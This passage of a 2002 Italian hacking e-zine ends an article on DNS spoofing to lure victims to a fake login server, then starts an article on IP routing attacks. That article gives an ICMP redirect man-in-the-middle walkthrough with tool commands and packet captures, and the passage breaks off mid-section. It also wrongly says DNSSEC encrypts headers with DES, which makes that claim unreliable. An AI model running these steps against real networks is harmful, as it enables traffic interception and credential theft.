|     ip address secondo le note procedure di ricerca tabellare nei DNS    |
|     in modalita' ricorsiva e/o iterativa come spiegato nella sezione     |
|     iniziale                                                             |
|                                                                          |
|  3) Il sistema vedra' ritornare da DNS_VITTIMA un record del tipo:       |
|                                                                          |
|             serv.vittima.edu.  IN  A  x.x.x.x                            |
|                                                                          |
|  4) Telnet iniziera' il 3way Handshake con serv.vittima.edu, scambiera'  |
|     le classiche richieste di option,feature e nvt compliancy (DO/DON'T- | 
|     WILL/WON'T),quindi si vedra' tornare il classico banner del server   |
|     ed il prompt di login.                                               |
|                                                                          |
|  5) La vittima effettuera' il login normalmente, fara' i suoi lavori..   |
|                                                                          |
|  6) La vittima (o il server) chiudera' la connessione.                   |
|                                                                          |
|                                                                          |
|  Processo AmPaRo:                                                        |
|                                                                          |
|  1) vittima$ telnet serv.vittima.edu                                     |
|     /* Vittima richiede connessione telnet all'indirizzo SER_VITTIMA */  |
|                                                                          |
|  2) Avendo usato per la connessione telnet un hostname FDQN al posto di  |
|     un IP address,il sistema si preoccupera' di cercar il corrispondente | 
|     ip address secondo le note procedure di ricerca tabellare nei DNS    |
|     in modalita' ricorsiva e/o iterativa come spiegato nella sezione     |
|     iniziale                                                             |
|                                                                          |
|  3) Il sistema vedra' ritornare da DNS_VITTIMA un record del tipo:       |
|                                                                          |
|             serv.vittima.edu.  IN  A  x.x.x.5                            |
|                                                                          |
|  4) Telnet iniziera' il 3way Handshake con serv.vittima.edu, scambiera'  |
|     le classiche richieste di option, feature e nvt compliancy(DO/DON'T- | 
|     WILL/WON'T),quindi si vedra' tornare il classico banner del server   |
|     ed il prompt di login.                                               |
|                                                                          |
|  5) La vittima effettuera' il login normalmente.                         |
|                                                                          |
|  6) Il server potrebbe rispondere con un banner indicante impossibilita' | 
|     temporanea di usufruire del server per qualche minuto per problemi   |
|     tecnici o altro (qui sovviene il campo TTL dell'header dns..)        |
|                                                                          |
|  7) Il server chiudera' la connessione                                   |
|                                                                          |
|  Vantaggi:                                                               |
|                                                                          |
|  - Applicabilit? a diversi protocolli e sistemi che abbiano in comune la | 
|    richiesta di autenticazione non crittografata , quindi ad esempio     |
|    Telnet - Ftp - Pop3 - Imap etc.. nonche' routers etc..                |
|    Certamente per un router la strategia cambiera' in quanto oltre alla  |
|    redirezione dell'host ed al fake server dinamico, dovremmo occuparci  |
|    di forwardare i pacchetti in ricezione ad un altro router stando      |
|    attenti di non creare un packets loop (anche se esistono algoritmi    |
|    appositi come split horizon etc.., e il campo TTL dell'header IP che  |
|    non consente + di tot hop a seconda dell'OS).                         |
|                                                                          |
|                                                                          |
|  Svantaggi:                                                              |
|                                                                          |
|  - Non applicabilit? a tutti i sistemi in quanto il poisoning/spoofing   |
|    dei record DNS e' stato messo sotto controllo in differenti modi:     |
|    * Double inverse lookup, ovvero (contrassegnato da "@"):              |
|                                                                          |
|      + server riceve connessione dall'indirizzo 192.168.5.5 (ATTACKER)   |
|      + server richiede una risoluzione reverse lookup per l'indirizzo:   |
|                                                                          |
|                 5.5.168.192.in-addr.arpa.  PTR  ?                        |
|                                                                          |
|      + server ricever? l'hostname corrotto:                              |
|                                                                          |
|                 5.5.168.192.in-addr.arpa.  PTR   remote.firm.com.        |
|                                                                          |
|      @ server rifar? una richiesta per:                                  |
|                                                                          |
|                 remote.firm.com.  A  ?                                   |
|                                                                          |
|      @ server ricever? l'hostname reale:                                 |
|                                                                          |
|                 remote.firm.com.  A  192.168.4.4                         |
|                                                                          |
|      @ server controller? l'eguaglianza dei due ip ricevuti:             |
|                                                                          |
|                 192.168.4.4 == 192.168.5.5  ?  OK : KO                   |
|                                                                          |
|    Questo svantaggio sarebbe risolvibile non difficilmente avvelenando   |
|    anche il record A ( oltre al PTR) in modo da avere due risultati      |
|    identici anche con il double inverse lookup.                          |
|    L'unica difficolta' e' che spesso e volentieri per sicurezza,         |
|    i database per il reverse lookup vengono posti su un altro server;    |
|    Cio' implicherebbe la compromissione anche dell'altro server, o       |
|    l'iniezione di una record nel campo Additional con il record voluto,  |
|    sperando che il server accetti e non controlli quel campo.            |
|                                                                          |
|  - Altro problema, in questo caso di complessa soluzione, che per        |
|    fortuna e' quasi impossibile da bypassare, e' il possibile utilizzo   |
|    del DNSSec, implementazione per i pacchetti DNS del valido IPSec      |
|    usato spesso nelle VPN in concomitanza con IKE.                       |
|    DNSSEC oltre a crittografare gli header dns con DES mediante uso di   |
|    chiave privata (algoritmo simmetrico), aggiunge diverse opzioni per   |
|    il controllo dei dati e rende pienamente statefull la connessione in  |
|    modo da avere traccia delle query e dei response.                     |
|                                                                          |
|  - In aggiunta soggiunge la patch dello SNI, creata appena dopo aver     |
|    scoperto la vulnerabilita' proprio da loro, che implementa una        |
|    randomizzazione dei query/response ID in modo da rendere molto piu'   |
|    complesso l'indovinare il numero di sequenza, che nelle versioni di   |
|    Bind piu' obsolete della 4.9.6 e 8.1.1 (anch'esse comunque            |
|    vulnerabili a diversi attacchi) viene facilmente predetto in quanto   |
|    aumenta di 1 ad ogni query. Bind 9.x comprende gia' questa patch.     |
|                                                                          |
|  Il progetto AmPaRo coesiste con il presente testo anche senza farne     |
|  parte. Il tar.gz con i sorgenti e vari si trova in development e sara'  |
|  disponibile al piu' presto..nei migliori negozi di giocattoli.. :P      |
|                                                                          |
|                                                                          |
|  0x09) Greetings and Byez:                                               |
|                                                                          |
|  to:   Raoul(Nobody),FuSyS, Nail, Tritemius, Vecna, Recidjvo, Naif,      |
|        Dark-Angel,xenion,(ml && devel)@sikurezza.org,#sikurezza,         |
|        #ondaquadra and #hackmaniaci. Bfi-Ondaquadra-Phrack e-zines.      |
|        W.R.Stevens, B.Kernigham and D.Ritchie and..anyone who wants.     |
|                                                                          |
|  special dudes ( ;P ): inquis, bitflesh, sgrakkyu                        |
|                                                                          |
|                                                                          |
|  0x0A) Resources                                                         |
|                                                                          |
|  1][RFC1034] Mockapetris, P., "Domain Names - Concepts and               |
|           Facilities", STD 13, RFC 1034, USC/Information Sciences        |
|           Institute, November 1987.                                      |
|                                                                          |
|  2][RFC1035] Mockapetris, P., "Domain Names - Implementation and         |
|           Specification", STD 13, RFC 1035, USC/Information Sciences     |
|           Institute, November 1987.                                      |
|                                                                          |
|  3][RFC1183] Everhart, C., Mamakos, L., Ullmann, R., and P. Mockapetris, | 
|           Editors, "New DNS RR Definitions", RFC 1183, Transarc,         |
|           University of Maryland, Prime Computer, USC/Information        |
|           Sciences Institute, October 1990.                              |
|                                                                          |
|  4][RFC1706] Manning, B., and R. Colella, "DNS NSAP Resource Records",   |
|           RFC 1706, USC/ISI and NIST, October 1994.                      |
|                                                                          |
|  5][RFC1712] Farrell, C., M. Schulze, B. Pleitner, and D. Baldoni, "DNS  |
|           Encoding of Geographical Location", RFC 1712, Curtin           |
|           University of Technology, October 1994.                        |
|                                                                          |
|  6][RFC1995] Ohta, M., "Incremental Zone Transfer in DNS", RFC 1995,     |
|           Tokyo Institute of Technology, August 1996.                    |
|                                                                          |
|  7][RFC1996] Vixie, P., "A Mechanism for Prompt Notification of Zone     |
|           Changes (DNS NOTIFY)", RFC 1996, ISC, August 1996.             |
|                                                                          |
|  8][RFC2052] Gulbrandsen, A., and P. Vixie, "A DNS RR for Specifying the | 
|           Location of Services (DNS SRV)", RFC 2052, Troll               |
|           Technologies, Vixie Enterprises, October 1996.                 |
|                                                                          |
|  9][RFC2065] Eastlake, D., and C. Kaufman, "Domain Name System Security  |
|           Extensions", RFC 2065, CyberCash, Iris, January 1997.          |
|                                                                          |
|  10][RFC2136] Vixie, P., S. Thomson, Y. Rekhter, and J. Bound, "Dynamic  |
|           Updates in the Domain Name System (DNS UPDATE) Dynamic         |
|           Updates in the Domain Name System (DNS UPDATE), RFC 2136,      |
|           ISC, Bellcore, Cisco, DEC, April 1997.                         |
|                                                                          |
|  11][RFC2163] Allocchio, C., "Using the Internet DNS to Distribute MIXER | 
|           Conformant Global Address Mapping (MCGAM)", RFC 2163,          |
|           GARR-Italy, July 1977.                                         |
|                                                                          |
|  12][RFC2168] R. Danie1, M. Mealling., "Resolution of Uniform Resource   |
|           Identifiers using the Domain Name System", RFC 2168, Los       |
|           Alamos National Laboratory, Network Solutions, Inc.,           |
|           June 1997.                                                     |
|                                                                          |
|  13][RFC2230] Atkinson,R., "Key Exchange Delegation Record for the DNS", | 
|           RFC 2230, NRL, October 1997.                                   |
|                                                                          |
|  14] URL: http://www.sunworld.com/swol-11-1997/swol-11-bind.html         |
|           (22 July, 2000).                                               |
|                                                                          |
|  15] Network Ice Corporation. "dig."                                     |
|           http://www.netice.com/advice/Reference/Tools/dig/default.htm   |
|           (22 July,2000)                                                 |
|                                                                          |
|  16] Mr.DNS."Restricting zone transfers in BIND 4.9.x with the xfernets  |
|           directive." URL: http://acmebw.com/askmrdns/00031.htm          |
|           (22 July, 2000).                                               |
|                                                                          |
|  17] Matt Larson and Cricket Liu. "Using BIND: Don't get spoofed again:  |
|           Learn how to secure your Internet domain name servers."        |
|           June 5, 2000.                                                  |
|                                                                          |
|  18] Network Ice Corporation. "DNS Zone Transfer."                       |
|           URL: http://www.netice.com/advice/intrusions/2000401           |
|           (22 July,2000).                                                |
|                                                                          |
|  19] Spitzner, Lance. "Know Your Enemy." 21 July 2000.                   |
|           URL: http://www.enteract.com/~lspitz/enemy.html                |
|           (21 July, 2000).                                               |
|                                                                          |
|  20] Network Ice Corporation. "Split-DNS"                                |
|           URL:http://www.netice.com/advice/Services/Directory/DNS/   ->  |
|           split-DNS/default.htm                                          |
|           22 July, 2000).                                                |
|                                                                          |
|                                                                          |
|  0x0B) GPG Key                                                           |
|                                                                          |
|                                                                          |
|   -----BEGIN PGP PUBLIC KEY BLOCK-----                                   |
|   Version: GnuPG v1.0.7 (GNU/Linux)                                      |
|                                                                          |
|   mQGiBD2G/ocRBACODjOoWbKAQMlivZtL1aqMrlBxu7J38/Cn5Fj7atnfovKYQDmS       |
|   EsJJ1lOduWjnBhNVfORk59pVmjxRigAYcGQKSEuHmuwY+U8DFWxs/kBba5Afh02D       |
|   y+ZuF5smF4zlPhZN90uIgVBZjjE41dCtxsZUT+TABPpO9jaTpq5FFf+gjwCgkJvL       |
|   yJ1Z9peewFYiE4bsZAVNU8UD/13SNgCs0gJaQ8wmgbUO+6CPd5O+iGf9cRdH9WS3       |
|   padzF7RV6SPF42UtxyhjrKYuTvrD+1BztBHLCU3IIzMkk9vQqK5FBMSwJfy46FED       |
|   +/EqbtcE59oOZrZog1iTNJ/xbqnRtwiMbmHEeeGwnzSwzCavIWkVRgDCipCIZWmn       |
|   ykIYA/sGejiym67W91uaVfFQG5Gj22tvFIf/PtmTdEJkcEjhVTu60I3EujtLg9tT       |
|   k58j1NEC51r0dQdpVjYr1l0jOdEUyq1gnJjAmLJrZcV+1AtFhlw9Cfzt/Md/GeJR       |
|   W2NcipI84sIfP0XLi0DUD/qxnhoHqRPsTON9VbSgwc3CifYZOrQgU05IWVBFUiA8       |
|   c25oeXBlckBvbmRhcXVhZHJhLm9yZz6IWQQTEQIAGQUCPYb+hwQLBwMCAxUCAwMW       |
|   AgECHgECF4AACgkQH/9PHJrVgDKrpQCeObSXOI03S9QkJU4UtyDjZbmh74oAn2Ds       |
|   NevNimBAb53FrDK+LGiQbOOCuQENBD2G/owQBADw6fsNFbaBlwV/llAd/0jmUAym       |
|   o+tei3G9JiPRgcCO9eVJvUADsvVU+8NbfJQV3sI3AJsuUb4TEdjhwQDokrbgNGDT       |
|   2vuZWsr4jJoz2TH5Lpgcdoe3q9pMzuDR5pa0EpQ7HlfePqlkAan+niqRH1+YPZYr       |
|   sF06ec4nL2gqJNyO0wADBgQAl9VoYKW0IIE3dIr+vdAfI1X5h1KSbHrMzHD6UZu2       |
|   YgOV/DT7ULRnjxZqi2R6YNirbk5lp3xtgy0grN24hNCt7Qs3ZoSKEGOxrt6uGav2       |
|   IL+YbtKdq/kGpcVMRqm3Ah9Rm1wn+KZ8nAY0FHL87VPr2els7J2kAlnNKSboVmu4       |
|   CByIRgQYEQIABgUCPYb+jAAKCRAf/08cmtWAMk3qAJ4wrJyNZ8TT2K0SAymcpGAT       |
|   ZpH72QCbBth8Z/SpnLi/H3ZrHTfHotgJv9A=                                   |
|   =naJY                                                                  |
|   -----END PGP PUBLIC KEY BLOCK-----                                     |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ HACKiNG                                    #08 - 01/11/2002 |
| iP R0UTiNG ATTACK                                       [eazy] 0x06/0x1A |
+--------------------------------------------------------------------------+
|                                                                          |
| 1. IP Routing Principles                                                 |
|                                                                          |
| 2. IP Routing Attack                                                     |
|   2.1 ICMP Redirect                                                      |
|   2.2 ICMP Router Discovery                                              |
|   2.3 Source Ruoting                                                     |
|   2.4 DHCP Spoofing                                                      |
|   2.5 HSRP e VRRP                                                        |
|                                                                          |
| 3. Risorse                                                               |
|                                                                          |
|                                                                          |
|                                                                          |
| 1. IP Routing Principles                                                 |
|                                                                          |
| Il processo che permette la consegna non garantita dei pacchetti tra     |
| host appartenenti a reti differenti Φ conosciuto con il nome di routing  |
| (o instradamento).                                                       |
| Questa funzione Φ quasi interamente affidata al protocollo IP il quale   |
| fornisce un servizio non garantito e non finalizzato alla connessione ai | 
| protocolli di livello superiore dello stack TCP/IP.                      |
| Per non garantito si intende che non fornisce alcuna garanzia che il     |
| pacchetto giunga a destinazione, mentre per non finalizzato alla         |
| connessione si intende che non memorizza alcun tipo di riferimento       |
| riguardo ai datagrammi inviati e non vi Φ alcuna dipendenza tra di essi. | 
| Ogni host che si avvalga del TCP/IP per comunicare in rete pu≥ agire     |
| principalmente in due maniere:                                           |
|                                                                          |
| - host: invia e riceve pacchetti che hanno come sorgente o come          |
|   destinazione la propria stazione, si tratta della modalitα di          |
|   funzionamento riscontrabile nella stragrande maggioranza dei casi (es. | 
|   il proprio computer di casa di norma agisce come semplice host);       |
|                                                                          |
| - router: oltre ad agire come host ha la funzione di instradare i        |
|   pacchetti che provengono da host differenti dal proprio, garantendo    |
|   la consegna dei pacchetti tra reti differenti, questi dispositivi sono | 
|   generalmente dotati di due o pi∙ interfacce di rete e si affacciano in | 
|   tal modo su pi∙ di una rete contemporaneamente.                        |
|                                                                          |
| Indipendentemente che si tratti di host o di router entrambe le macchine | 
| possiedono una tabella di routing che Φ possibile consultare dall'       |
| interprete dei comandi in questo modo:                                   |
|                                                                          |
| # netstat -rn                                                            |
| Kernel IP routing table                                                  |
| Destination   Gateway       Genmask        Flags  MSS Window  irtt Iface | 
| 192.168.1.0   0.0.0.0       255.255.255.0  U       40 0          0 eth0  |
| 127.0.0.0     0.0.0.0       255.0.0.0      U       40 0          0 lo    |
| 0.0.0.0       192.168.1.1   0.0.0.0        UG      40 0          0 eth0  |
|                                                                          |
| oppure...                                                                |
|                                                                          |
| # route -n                                                               |
| Kernel IP routing table                                                  |
| Destination   Gateway       Genmask         Flags Metric Ref   Use Iface | 
| 192.168.1.0   0.0.0.0       255.255.255.0   U     0      0       0 eth0  |
| 127.0.0.0     0.0.0.0       255.0.0.0       U     0      0       0 lo    |
| 0.0.0.0       192.168.1.1   0.0.0.0         UG    1      0       0 eth0  |
|                                                                          |
| o anche da MS-DOS...                                                     |
|                                                                          |
| C:\>route print                                                          |
|                                                                          |
| Route attive:                                                            |
|                                                                          |
|   Indirizzo rete         Maschera  Indirizzo gateway    Interfac. Metric | 
|           0.0.0.0          0.0.0.0     192.168.1.1   192.168.1.35      1 | 
|         127.0.0.0        255.0.0.0       127.0.0.1      127.0.0.1      1 | 
|       192.168.1.0    255.255.255.0    192.168.1.35   192.168.1.35      1 | 
|      192.168.1.35  255.255.255.255       127.0.0.1      127.0.0.1      1 | 
|     192.168.1.255  255.255.255.255    192.168.1.35   192.168.1.35      1 | 
|         224.0.0.0        224.0.0.0    192.168.1.35   192.168.1.35      1 | 
|   255.255.255.255  255.255.255.255    192.168.1.35        0.0.0.0      1 | 
|                                                                          |
|                                                                          |
| Quando un host deve inviare un pacchetto la prima cosa che fa Φ          |
| consultare la propria tabella di routing, tramite il processo di messa   |
| in AND dell'IP di destinazione e la netmask determina se il destinatario | 
| del pacchetto Φ un host locale (all'interno della stessa rete locale) o  |
| un host remoto.                                                          |
| Nel primo caso l'host preso in esame genera un frame il cui header a     |
| livello fisico contiene come MAC address di destinazione l'indirizzo     |
| fisico della scheda dell'host destinatario del pacchetto (ricavato       |
| mediante ARP request) e l'header IP (livello rete) contiene come IP di   |
| destinazione l'IP address del sistema destinatario.                      |
| Il pacchetto attraverserα una porzione del mezzo fisico che connette i   |
| due host e giungerα a destinazione senza bisogno di alcuna mediazione di | 
| terze parti.                                                             |
| Le cose cambiano leggermente nel caso in cui la destinazione dovesse     |
| rivelarsi un host remoto, l'host mittente provvederα a specificare all'  |
| interno dell'header fisico un MAC address di destinazione relativo al    |
| router indicato nella propria routing table o al router di default nel   |
| caso in cui non compaia una route specifica per tale destinazione.       |
| L'header IP si presenterα identico al caso precedente.                   |
| Il pacchetto giungerα in un primo momento al router il cui indirizzo     |
| MAC figura come destinazione all'interno dell'header del livello fisico  |
| del frame. L'interfaccia di rete del router esamina l'intestazione del   |
| frame per vedere se l'indirizzo MAC di destinazione corrisponde al       |
| proprio e in caso affermativo procede al demultiplexing(1) del frame che | 
| continua ad essere processato al livello superiore dello stack TCP/IP.   |
|                                                                          |
| (1) demultiplexing: quando un frame giunge all'interfaccia di rete dell' | 
|     host di destinazione procede verso l'alto dello stack, per ogni      |
|     livello della pila che attraversa gli viene rimosso il relativo      |
|     header. Ogni protocollo prende visione di uno specifico campo del    |
|     proprio header per decidere chi debba ricevere il campo dati del     |
|     pacchetto a livello superiore.                                       |
|                                                                          |
| L'indirizzo IP di destinazione contenuto nell'header del pacchetto viene | 
| confrontato con il proprio ma di fatto risultano differenti (l'IP di     |
| destinazione del pacchetto non Φ il router bens∞ il sistema finale) cos∞ | 
| il router provvede ad instradare il pacchetto avvalendosi delle          |
| informazioni contenute nella propria routing table.                      |
| Se tutto va bene il pacchetto giungerα a destinazione sano e salvo dopo  |
| aver attraversato un numero non ben precisato di hop(2).                 |
|                                                                          |
| (2) hop: un hop Φ rappresentato da un router o da qualsiasi dispositivo  |
|     con funzionalitα di routing in grado di provvedere all'instradamento | 
|     dei pacchetti.                                                       |
|                                                                          |
| 2. IP Routing Attack                                                     |
|                                                                          |
| Il routing dei pacchetti soffre di alcune debolezze che riguardano in    |
| particolare le modalitα con cui le tabelle di routing dei vari host      |
| vengono inizializzate ed aggiornate.                                     |
| Nel seguito dell'articolo analizzeremo le modalitα con cui un utente     |
| malizioso pu≥ interferire in tale processo al fine di compromettere la   |
| confidenzialitα e l'integritα dei dati trasmessi.                        |
|                                                                          |
| 2.1 ICMP Redirect                                                        |
|                                                                          |
| Un messaggio ICMP redirect viene inviato da un router all'host sorgente  |
| quando un determinato pacchetto pu≥ giungere a destinazione attraverso   |
| un percorso alternativo che presenta una metrica(3) migliore.            |
|                                                                          |
| (3) metrica: la metrica rappresenta il numero di hop necessari per       |
|     raggiungere una specifica destinazione, pi∙ piccolo Φ il suo valore  |
|     e migliore Φ il percorso.                                            |
|                                                                          |
| L'host sorgente che riceve il messaggio ICMP redirect PUO' aggiornare la | 
| propria routing table in accordo alle informazioni in esso contenute.    |
| Lo schema riportato in seguito Φ tratto dall'RFC 792 e illustra la       |
| struttura di tale messaggio:                                             |
|                                                                          |
| Redirect Message                                                         |
|                                                                          |
|     0                   1                   2                   3        |
|     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1      |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |     Type      |     Code      |          Checksum             |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |                 Gateway Internet Address                      |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|    |      Internet Header + 64 bits of Original Data Datagram      |     |
|    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+     |
|                                                                          |
|                                                                          |
| L'header del pacchetto IP in cui il messaggio ICMP viene incapsulato     |
| determina il mittente del messaggio (il router a cui l'host ha affidato  |
| un proprio pacchetto), il campo "Gateway Internet Address" rappresenta   |
| il router alternativo consigliato per raggiungere una data destinazione, | 
| tale destinazione pu≥ essere univocamente determinata in base alle       |
| informazione contenute nel campo dati del pacchetto ICMP (l'header del   |
| pacchetto che ha causato il redirect).                                   |
| Alla luce di quanto detto un utente malizioso Φ in grado di modificare   |
| l'instradamento del traffico di un host arbitrario forgiando un          |
| messaggio ICMP di tipo 5 fasullo il cui indirizzo IP di provenienza sia  |
| spoofato con quello del router correntemente utilizzato dalla vittima e  |
| presentando il proprio host come router alternativo per una data         |
| destinazione.                                                            |
| Operando in tal modo l'attacker potrα garantire al proprio host una      |
| posizione privilegiata, anche detta man in the middle, dalla quale sarα  |
| in grado di modificare il traffico che lo attraversa.                    |
| Le route inserite nelle tabella di routing dell'host vittima in seguito  |
| ad un ICMP redirect sono temporanee e per tanto vanno rinfrescate ad     |
| intervalli regolari con ulteriori redirect.                              |
| L'unica condizione necessaria alla riuscita di tale attacco Φ che        |
| l'attacker deve essere in grado di sniffare i pacchetti provenienti      |
| dalla vittima al fine di poter forgiare un pacchetto ICMP redirect       |
| valido che contenga l'IP header e 64 bit di dati del pacchetto           |
| originale.                                                               |
|                                                                          |
| Alcuni sistemi accettano di default i messaggi ICMP redirect e risultano | 
| di conseguenza vulnerabili a questo tipo di attacco.                     |
| In particolare Windows98 e diverse distribuzioni Linux accettano di      |
| default i redirect (testata Slackware 8.0 risulta vulnerabile), sotto    |
| Linux Φ possibile accedere ai settaggi che consentono di abilitare e     |
| disabilitare i redirect tramite /proc filesystem:                        |
|                                                                          |
| # cat /proc/sys/net/ipv4/conf/eth0/accept_redirects                      |
| 1                                                                        |
|                                                                          |
| Segue un breve esempio di attacco che sfrutta gli ICMP redirect per      |
| realizzare una condizione di man in the middle, il tool utilizzato nell' | 
| esempio fa parte del pacchetto IRPAS dei Phenoelit.                      |
| Quella che segue Φ la descrizione di un ipotetico scenario d'attacco:    |
|                                                                          |
| Default Gateway -> IP 192.168.1.1       MAC rr:oo:uu:tt:ee:rr            |
| Attacker        -> IP 192.168.1.4       MAC aa:tt:tt:aa:cc:kk            |
| Victim          -> IP 192.168.1.6       MAC vv:ii:cc:tt:ii:mm            |
|                                                                          |
| L'attacker abilitα l'IP forwarding sul proprio host al fine di           |
| permettere al flusso di pacchetti rediretto di attraversare il proprio   |
| host.                                                                    |
|                                                                          |
| # echo 1 > /proc/sys/net/ipv4/ip_forward                                 |
|                                                                          |
| Inibisce la generazione da parte dello stack TCP/IP di ICMP redirect     |
| legittimi che potrebbero compromettere la riuscita dell'attacco.         |
|                                                                          |
| # iptables -A OUTPUT -s 192.168.1.4 -p icmp --icmp-type 5 -j DROP        |
|                                                                          |
| Il tool icmp_redirect ha lo scopo di sniffare i pacchetti generati dalla | 
| vittima e forgiare un pacchetto ICMP redirect contenente l'IP header e   |
| 64 bit di dati del pacchetto originale.                                  |
|                                                                          |
| # ./icmp_redirect -i eth0 -s 192.168.1.6/255.255.255.255 -G 192.168.1.4  |
|   -S 192.168.1.1                                                         |
| ICMP local redirector $Revision: 1.4 $                                   |
|         (c) 2k++ FX &lt;fx@phenoelit.de>                                    |
|         Phenoelit (http://www.phenoelit.de)                              |
|         IRPAS build XXXIX                                                |
|                                                                          |
| In questo modo attendiamo il prossimo pacchetto proveniente dall'host    |
| sorgente (-s) 192.168.1.6, e faremo in modo di proporci come miglior     |
| gateway (-G) 192.168.1.4 preoccupandoci che la sorgente del pacchetto    |
| sembri provenire dal default gateway (-S) 192.168.1.1 a cui il traffico  |
| Φ destinato.                                                             |
| Qui di seguito riporto l'output commentato di tcpdump che illustra i     |
| pacchetti generati dagli host interessati:                               |
|                                                                          |
| # tcpdump -ne                                                            |
| tcpdump: listening on eth0                                               |
| ## pacchetto SYN inviato dalla vittima verso un host remoto, il MAC      |
| ## address di destinazione corrisponde a quello del default gateway      |
| 20:19:57.605301 vv:ii:cc:tt:ii:mm rr:oo:uu:tt:ee:rr 0800 74:             |
| 192.168.1.6.1027 > 216.239.51.100.80: S 2243434109:2243434109(0)         |
| win 16060 &lt;mss 1460,sackOK,timestamp 19316[|tcp]> (DF) [tos 0x10]        |
|                                                                          |
| ## ICMP redirect message inviato da attacker ma spoofato con l'IP del    |
| ## default gateway, si pu≥ notare che il source MAC address del frame    |
| ## corrisponde all'indirizzo della scheda del sistema attacker           |
| 20:19:57.605538 aa:tt:tt:aa:cc:kk vv:ii:cc:tt:ii:mm 0800 70:             |
| 192.168.1.1 > 192.168.1.6: icmp:redirect 216.239.51.100 to net           |
| 192.168.1.4                                                              |
|                                                                          |
| ## pacchetto SYN/ACK di risposta proveniente dall'host remoto            |
| 20:19:57.798993 rr:oo:uu:tt:ee:rr vv:ii:cc:tt:ii:mm 0800 74:             |
| 216.239.51.100.80 > 192.168.1.6.1027: S 97283257:97283257(0)             |
| ack 2243434110 win 32120 &lt;mss 1460,sackOK,timestamp 135811052[|tcp]>     |
| (DF) [tos 0x38]                                                          |
|                                                                          |
| ## pacchetto ACK inviato dalla vittima, ora il MAC address di            |
| ## destinazione NON Φ pi∙ quello del default gateway ma bens∞ quello del | 
| ## sistema controllato dall'attacker                                     |
| 20:19:57.799099 vv:ii:cc:tt:ii:mm aa:tt:tt:aa:cc:kk 0800 66:             |
| 192.168.1.6.1027 > 216.239.51.100.80: . ack 1 win 16060                  |
| &lt;nop,nop,timestamp 19336 135811052> (DF) [tos 0x10]                      |
|                                                                          |
| ## l'attacker si prende cura di instradare il traffico al default        |
| ## gateway che a sua volta lo inoltrerα verso la destinazione remota     |
| 20:19:57.799208 aa:tt:tt:aa:cc:kk rr:oo:uu:tt:ee:rr 0800 66:             |
| 192.168.1.6.1027 > 216.239.51.100.80: . ack 1 win 16060                  |
| &lt;nop,nop,timestamp 19336 135811052> (DF) [tos 0x10]                      |
|                                                                          |
| 5 packets received by filter                                             |
| 0 packets dropped by kernel                                              |
|                                                                          |
|                                                                          |
| 2.2 ICMP Router Discovery                                                |
|                                                                          |
| I messaggi ICMP router discovery forniscono un metodo alternativo per    |
| inizializzare le routing table di un host con gli indirizzi IP dei       |
| router adiacenti ad esso, tale compito infatti Φ solitamente affidato a  |
| dei file di configurazione statici richiamati a tempo di boot.           |
| Tale protocollo si avvale di due diversi messaggi:                       |
|                                                                          |
| - ICMP router advertisement message: viene inviato periodicamente da un  |
|   router all'indirizzo di broadcast o in risposta ad un ICMP router      |
|   solicitation, permettendo agli host circostanti di aggiornare la       |
|   propria routing table in accordo alle informazione in esso contenute.  |
|   Segue lo schema tratto dall'RFC 1256 che ne illustra il formato:       |
|                                                                          |
|   ICMP Router Advertisement Message                                      |
|                                                                          |
|        0                   1                   2                   3     |
|        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1   |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |     Type      |     Code      |           Checksum            |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |   Num Addrs   |Addr Entry Size|           Lifetime            |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                       Router Address[1]                       |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                      Preference Level[1]                      |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                       Router Address[2]                       |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                      Preference Level[2]                      |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                               .                               |  |
|       |                               .                               |  |
|       |                               .                               |  |
|                                                                          |
|                                                                          |
| - ICMP router solicitation message: viene inviato da un host all'        |
|   indirizzo di broadcast per sollecitare l'invio di un messaggio ICMP    |
|   router advertisement da parte dei router circostanti.                  |
|   Segue lo schema tratto dall'RFC 1256 che ne illustra il formato:       |
|                                                                          |
|   ICMP Router Solicitation Message                                       |
|                                                                          |
|        0                   1                   2                   3     |
|        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1   |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |     Type      |     Code      |           Checksum            |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|       |                           Reserved                            |  |
|       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  |
|                                                                          |
|                                                                          |
| Un utente malizioso avvalendosi delle funzionalitα offerte da tale       |
